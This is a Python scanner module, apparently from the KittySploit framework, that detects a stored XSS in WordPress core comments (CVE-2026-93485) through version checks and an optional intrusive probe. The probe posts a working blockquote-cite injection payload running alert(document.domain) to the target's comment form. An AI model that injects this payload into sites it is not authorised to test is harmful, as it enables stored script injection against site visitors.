#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Core < 7.1.1 Comment2Shell stored XSS (CVE-2026-93485)."""

from __future__ import annotations

import json
import re
import secrets
from typing import Optional, Tuple
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

CVE_ID = "CVE-2026-93485"
_FIXED = (7, 1, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress Core CVE-2026-93485 Comment2Shell detect",
        "description": (
            "Detects stored XSS via blockquote cite newline injection in comments "
            "(WordPress < 7.1.1)."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": [CVE_ID],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-93485",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-93485.yaml",
        ],
        "modules": ["exploits/multi/http/wp_comment2shell_cve_2026_93485_xss"],
        "tags": ["web", "scanner", "wordpress", "wp-core", "xss", "cve-2026-93485"],
        "agent": {"approval_required": True},
    }

    active_probe = OptBool(
        False,
        "Post test comment with marker (intrusive, spam)",
        required=False,
    )

    def _core_version(self) -> Optional[Tuple[int, int, int]]:
        for path in ("/readme.html", "/feed/"):
            r = self.http_request(method="GET", path=path, allow_redirects=True)
            if not r:
                continue
            match = re.search(
                r"(?:WordPress\s+([\d.]+)|content=[\"']WordPress\s+([\d.]+)[\"'])",
                r.text or "",
                re.I,
            )
            if match:
                ver = (match.group(1) or match.group(2) or "").strip()
                parts = [int(x) for x in ver.split(".")[:3]]
                while len(parts) < 3:
                    parts.append(0)
                return tuple(parts[:3])
        return None

    def _open_comment_post_id(self) -> Optional[int]:
        r = self.http_request(
            method="GET",
            path="/wp-json/wp/v2/posts?per_page=5&_fields=id,comment_status",
            allow_redirects=True,
        )
        if not r or int(r.status_code) != 200:
            return None
        try:
            items = json.loads(r.text or "[]")
        except json.JSONDecodeError:
            return None
        for row in items:
            if row.get("comment_status") == "open" and row.get("id"):
                return int(row["id"])
        return None

    def _comment_probe(self, post_id: int, marker: str) -> bool:
        payload = (
            "%3Cblockquote+cite%3D%22a%0Ab%22%3E%3Ccode%3Ex%22+onfocus%3Dalert%28document.domain%29+"
            "autofocus+tabindex%3D0%3C%2Fcode%3E%3C%2Fblockquote%3E+"
            f"{quote(marker)}"
        )
        data = (
            f"comment={payload}"
            f"&author=ks-test&email=ks%40example.test&url="
            f"&comment_post_ID={post_id}&comment_parent=0"
        )
        post = self.http_request(
            method="POST",
            path="/wp-comments-post.php",
            data=data,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": f"/?p={post_id}",
            },
            allow_redirects=True,
        )
        if not post or int(post.status_code) not in (200, 302):
            return False
        page = self.http_request(method="GET", path=f"/?p={post_id}", allow_redirects=True)
        if not page or int(page.status_code) != 200:
            return False
        body = page.text or ""
        if marker not in body:
            return False
        return bool(re.search(r'<blockquote[^>]*cite="[^"]*<p>', body))

    def run(self):
        version_t = self._core_version()
        version_s = ".".join(map(str, version_t)) if version_t else ""
        if version_t and self.wp_version_to_tuple(version_s) >= self.wp_version_to_tuple("7.1.1"):
            return False
        post_id = self._open_comment_post_id()
        if not post_id:
            self.set_info(
                severity="info",
                cve=CVE_ID,
                reason=f"WordPress {version_s or 'unknown'} may be affected; no open comments",
            )
            return False
        if not self.active_probe:
            self.set_info(
                severity="high" if version_t else "medium",
                cve=CVE_ID,
                reason=(
                    f"WordPress {version_s or 'unknown'} < 7.1.1 and comments open on post {post_id}; "
                    "Comment2Shell not injected"
                ),
                version=version_s or "unknown",
            )
            return True
        marker = f"KS{secrets.token_hex(6)}"
        if not self._comment_probe(post_id, marker):
            return False
        self.set_info(
            severity="critical",
            cve=CVE_ID,
            reason="Comment2Shell cite injection rendered broken blockquote",
            version=version_s or "unknown",
            confidence="high",
        )
        return True
